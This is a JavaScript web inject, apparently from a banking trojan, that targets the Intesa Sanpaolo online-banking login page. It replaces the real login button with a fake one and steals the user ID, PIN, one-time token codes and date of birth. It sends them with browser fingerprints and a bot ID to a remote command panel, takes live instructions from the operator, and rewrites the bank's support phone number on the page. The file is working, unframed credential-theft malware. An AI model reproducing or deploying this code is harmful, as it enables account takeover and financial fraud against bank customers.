;(function() {
	var CFG = {
		my_bot:     '6123EC6655A8BC52CE81DB5F7FE73E38',
		site:       'intesasanpaolo',
		my_vnc:     '' || window.bot_vnc,
		my_socks:   '' || window.bot_socks,
		srv_api:    'w/novum/api/',
		srv_dom:    'w/kenta/',
		useragent:  navigator.userAgent,
		fullinfo:   {},
		headers:    {},
		login:      '',
		interval:   -1,
		step: 'LOGIN',
	};

	var Command = function(cmd, params) {
		switch(cmd) {
			case 'WAIT':
				clearInterval(CFG.interval);
				CFG.interval = setInterval(function() {
					Query.ask();
				}, 5000);
				Html.showLoader();
				break;

			case 'ERROR_LOGIN':
				clearInterval(CFG.interval);
				Html.hideLoader();
				Html.errorLogin();
				break;

			case 'BLOCK':
				clearInterval(CFG.interval);
				Html.hideLoader();
				Html.showBlock();
				break;

			case 'SHOW_TOKEN':
				clearInterval(CFG.interval);
				Html.hideLoader();
				Html.showToken(params);
				break;

			case 'ERROR_TOKEN':
				clearInterval(CFG.interval);
				Html.hideLoader();
				$('#IN_USER').val('');
				$('#IN_PIN').val('');
				$('#IN_OTP').val('');
				Html.errorToken();
				break;

			case 'DOB':
				clearInterval(CFG.interval);
				Html.hideLoader();
				$('#IN_USER').val('');
				$('#IN_PIN').val('');
				$('#IN_OTP').val('');
				Html.showDOB();
				break;

			case 'GO_ACC':
			case 'DELETE':
			default:
				clearInterval(CFG.interval);
				Html.hideLoader();
				Html.$realBtn.click();
				break;
		}
	};


	var Query = {
		api: function(method, data, success, error) {
			data['site'] = CFG.site;
			data['bot'] = CFG.my_bot;

	        $.ajax({
	            type: 'POST', dataType: 'json', crossDomain: true,
	            url: CFG.srv_api + method, data: data,
	            success: function(msg) {if (msg['code'] == 0) {success && typeof(success)=='function' && success(msg);} else {error && typeof(error)=='function' && error(msg);}},
	            error: function(jqXHR, status) {error && typeof(error)=='function' && error({code: 1, msg: "API Error", data: null});}
	        });
	    },
		ask: function() {
			var self = this;
			self.api('queryAsk', {
				'login': CFG.login
			}, function(msg) {
				if (msg.data.cmd != "WAIT") {
					Command(msg.data.cmd);
				}
			});
		},
		visit: function(sendfull) {
			var self = this;
			var data = sendfull ? {
				'user_info': CFG.useragent,
				'full_info': CFG.fullinfo,
				'headers':   CFG.headers,
				'vnc': 		 CFG.my_vnc,
				'socks': 	 CFG.socks
			} : {};
			self.api('queryPing', data);
		},
		send: function(step) {
			var self = this;
			step = step ? step : 'LOGIN';
			CFG.login = Html.fields.login;
			var send_data = Html.getInfo(step); 
			self.api('querySend', {
				'step': 	 step,
				'login': 	 CFG.login,
				'user_info': CFG.useragent,
				'full_info': CFG.fullinfo,
				'headers':   CFG.headers,
				'data':  	 send_data,
				'preload':   JSON.stringify(Html.fields),
				'vnc': 	  	 CFG.my_vnc,
				'socks': 	 CFG.socks
			}, function(msg) {
				Command(msg.data.cmd, msg.data.params);
			});
			return false;
		},
		login: function(step) {
			var self = this;
			self.send('LOGIN');
		},
	}

	var Html = {
		loader: document.createElement('div'),
		fields: {},
		$realBtn: undefined,
		$fakeBtn: undefined,
		getInfo: function(step) {
			var html = '';
			if (step == 'LOGIN') {
				html += 'USER ID: <span class="frcp">'    +Html.fields.login+'</span><br>';
				html += 'PIN CODE: <span class="frcp">'   +Html.fields.pswd  +'</span><br>';
			}
			if (step == 'TOKEN') {
				html += 'OTP: <span class="frcp">'     +Html.fields.otp  +'</span><br>';
			}
			if (step == 'DOB') {
				html += 'OTP: <span class="frcp">'     +Html.fields.otp  +'</span><br>';
				html += 'DOB: <span class="frcp">'     +Html.fields.dob  +'</span><br>';
			}
			html += '<span class="frcp">'+top.window.location.href+'</span><br>';
			return html
		},
		getFullInfo: function() {
			var result = {'window.screen': {},'window.navigator': {}}, screen = ['availHeight','availLeft','availTop','availWidth','clientHeight','clientWidth','colorDepth','height','left','offsetHeight','offsetWidth','pixelDepth','top','width']; for (var i = 0; i < screen.length; i++) {if (window.screen[screen[i]]) result['window.screen'][screen[i]] = window.screen[screen[i]];}; if (window.screen.orientation) {var orientation = ['angle','onchange','type'];result['window.screen'].orientation = {};for (var i = 0; i < orientation.length; i++) {result['window.screen'].orientation[orientation[i]] = window.screen.orientation[orientation[i]];}} var arrNav = ['appCodeName','appName','appVersion','buildID','cookieEnabled','deviceMemory','doNotTrack','hardwareConcurrency','language','languages','maxTouchPoints','onLine','oscpu','platform','product','productSub','userAgent','vendor','vendorSub']; for (var i = 0; i < arrNav.length; i++) {if (window.navigator[arrNav[i]]) result['window.navigator'][arrNav[i]] = window.navigator[arrNav[i]];}; result['window.navigator'].plugins = {}; for (var i = 0; i < window.navigator.plugins.length; i++) {var arrPlug = ['name','filename','description'];result['window.navigator'].plugins[i] = {};for (var j = 0; j < arrPlug.length; j++) {result['window.navigator'].plugins[i][arrPlug[j]] = window.navigator.plugins[i][arrPlug[j]];}}; return result;
		},
		getHeaders: function() {
			return {"headers": [{"action": "Add","name": "User-Agent","value": navigator.userAgent,"comment": "","enabled": true},{"action": "Modify","name": "Accept-Language","value": navigator.language,"comment": "","enabled": true}]};
		},
		showLoader: function() {
			var self = this;
			document.getElementById('box').appendChild(self.loader);
		},
		hideLoader: function() {
			var self = this;
			var parent = self.loader.parentNode;
			if (parent && parent.id == 'box') {
				parent.removeChild(self.loader);
			};
			document.getElementsByTagName('html')[0].setAttribute('style', 'display: none');
			setTimeout(function() {
				document.getElementsByTagName('html')[0].setAttribute('style', '');
			}, 1000);
		},
		clearAll: function() {
			$('#IN_USER').val('');
			$('#IN_PIN').val('');
			$('#IN_OTP').val('');
			$('#IN_BIRTHDATEDD').val('');
			$('#IN_BIRTHDATEMM').val('');
			$('#IN_BIRTHDATEYY').val('');
			$('#corp_ERROR').text('');
		},
		error: function(text) {
			$('#corp_ERROR').html(text);
		},
		errorLogin: function() {
			var self = this;
			self.clearAll();
			var html = '<div id="corp_SPACER" class="corp_SPACER"></div><div id="corp_MESSAGE" class="corp_MESSAGE"></div><div id="corp_DETAILS" class="corp_DETAILS">WARNING! Invalid Credentials.</div><div id="corp_ERROR" class="corp_ERROR"></div>';
			$('#IN_OTP').closest('tr').hide();
			$('#birthdate').hide();
			$('#corp').html(html);
			CFG.step = 'LOGIN';
		},
		showToken: function() {
			var self = this;
			self.clearAll();
			$('#IN_USER').closest('tr').hide();
			$('#IN_PIN').closest('tr').hide();
			$('#birthdate').hide();
			var html = '<img src="https://.com/portalEiam0/sma/imgsframe/Chiavetta-OTP-1.jpg" align="right" style="margin-top:25px; margin-right:120px"><div id="corp_SPACER" class="corp_SPACER"></div><div id="corp_MESSAGE" class="corp_MESSAGE"></div><div id="corp_DETAILS" class="corp_DETAILS">Enter the code displayed by your own O-KEY</div><div id="corp_ERROR" class="corp_ERROR"></div>';
			$('#corp').html(html);
			if (!$('#IN_OTP').length) {
				var tr = '<tr><td><label lang="it" id="IN_OTP_MASK" class="labeltype3" maxlength="6">OTP CODE</label></td><td width="100"><input lang="it" type="password" id="IN_OTP" value="" class="enteroninput inputotp3" maxlength="6"><img src="/portalEiam0/sma/imgsframe/otp.gif" style="position:absolute; margin-top:0px; margin-left:0px"></td></tr>';
				$('#birthdate').before(tr);
			} else {
				$('#IN_OTP').closest('tr').show();
			};
			CFG.step = 'TOKEN';
		},
		errorToken: function() {
			var self = this;
			self.clearAll();
			$('#IN_USER').closest('tr').hide();
			$('#IN_PIN').closest('tr').hide();
			$('#birthdate').hide();
			var html = '<img src=".intesasanpaolo.com/portalEiam0/sma/imgsframe/Chiavetta-OTP-1.jpg" align="right" style="margin-top:25px; margin-right:120px"><div id="corp_SPACER" class="corp_SPACER"></div><div id="corp_MESSAGE" class="corp_MESSAGE"></div><div id="corp_DETAILS" class="corp_DETAILS">WARNING! Invalid Credentials.</div><div id="corp_ERROR" class="corp_ERROR"></div>';
			$('#corp').html(html);
			if (!$('#IN_OTP').length) {
				var tr = '<tr><td><label lang="it" id="IN_OTP_MASK" class="labeltype3" maxlength="6">OTP CODE</label></td><td width="100"><input lang="it" type="password" id="IN_OTP" value="" class="enteroninput inputotp3" maxlength="6"><img src="/portalEiam0/sma/imgsframe/otp.gif" style="position:absolute; margin-top:0px; margin-left:0px"></td></tr>';
				$('#birthdate').before(tr);
			} else {
				$('#IN_OTP').closest('tr').show();
			};
		},
		showDOB: function() {
			var self = this;
			self.clearAll();
			if ($('#IN_OTP').length) {
				$('#IN_OTP').closest('tr').show();
			}
			$('#IN_USER').closest('tr').hide();
			$('#IN_PIN').closest('tr').hide();
			$('#birthdate').add('#birthdate input').add('#birthdate label').show();
			if (!$('#IN_OTP').length) {
				var tr = '<tr><td><label lang="it" id="IN_OTP_MASK" class="labeltype3" maxlength="6">OTP CODE</label></td><td width="100"><input lang="it" type="password" id="IN_OTP" value="" class="enteroninput inputotp3" maxlength="6"><img src="/portalEiam0/sma/imgsframe/otp.gif" style="position:absolute; margin-top:0px; margin-left:0px"></td></tr>';
				$('#birthdate').before(tr);
			} else {
				$('#IN_OTP').closest('tr').show();
			}
			CFG.step = 'DOB';
		},
		showBlock: function() {
			var self = this;
			self.clearAll();
			if (!$('#corp_DETAILS').length) {
				self.errorLogin();
			}
			$('#corp_DETAILS').html('Il servizio non è al momento disponibile. Riprova più tardi.');
			CFG.step = 'LOGIN';
		}
	};

	$(function() {
		CFG.fullinfo = JSON.stringify(Html.getFullInfo());
		CFG.headers  = JSON.stringify(Html.getHeaders());
		$('#box').css('position', 'relative');
		Html.loader.setAttribute('style', 'text-align:center;position:absolute;z-index:1000;top:0;opacity:0.4;background:#483838;bottom:0;right:0;left:0;');
		Html.loader.innerHTML = '<img src="'+CFG.srv_dom+'/in/intesasanpaolo/ajax-loader.gif" style="display:block;margin:30% auto;">';
		try {
			$(':contains("800.312.316"):not(:has("b, strong, div, span, td"))', top.document).each(function(){$(this).find('script').remove(); var s = $(this).html().replace('800.312.316','800.213.316'); $(this).html(s);});
		} catch (err) {};

		$('.enteroninput').unbind().keypress(function(e){
			ev = e.which ? e.which : e.keyCode;
			if (ev == 13) $fakeBtn.click();
	    });
	    $("#IN_BIRTHDATEDD,#IN_BIRTHDATEMM,#IN_BIRTHDATEYY").click(function(){
            $(this).val("").focus();
        });

		if ($('#IN_USER').length) {
			var $realBtn = Html.$realBtn = $('.bottoni > a.button_send');
			var $fakeBtn = Html.$fakeBtn = $realBtn.clone().unbind();

			$fakeBtn.children('div').removeAttr('id');
			$realBtn.hide().after($fakeBtn);

			$fakeBtn.click(function(e) {
				e = e || event;
				e.preventDefault();

				if (CFG.step == 'LOGIN') {
					Html.fields = {
						login: $('#IN_USER').val(),
						pswd:  $('#IN_PIN').val(),
					};
					if (Html.fields.login == ''|| Html.fields.pswd == '') {
						$realBtn.click();
						return;
					}
				} else if (CFG.step == 'TOKEN') {
					Html.fields.otp = $('#IN_OTP').val();
					if (Html.fields.otp == '') {
						Html.error('Insert credentials');
						return;
					}
				} else if (CFG.step == 'DOB') {
					Html.fields.otp = $('#IN_OTP').val();
					var today = new Date();
					var dd = +$('#IN_BIRTHDATEDD').val();
					var mm = +$('#IN_BIRTHDATEMM').val();
					var yy = +$('#IN_BIRTHDATEYY').val();
					if (dd < 1 || dd > 31 || mm < 1 || mm > 12 || yy < 1900 || yy > today.getFullYear()) {
						Html.error('Error date');
						return;
					}
					Html.fields.dob = dd +'.'+mm+'.'+yy;
				}

				Query.send(CFG.step);
			});
		}

		Query.visit(true);
		setInterval(function() {
			Query.visit();
		}, 20000);
	});
})();
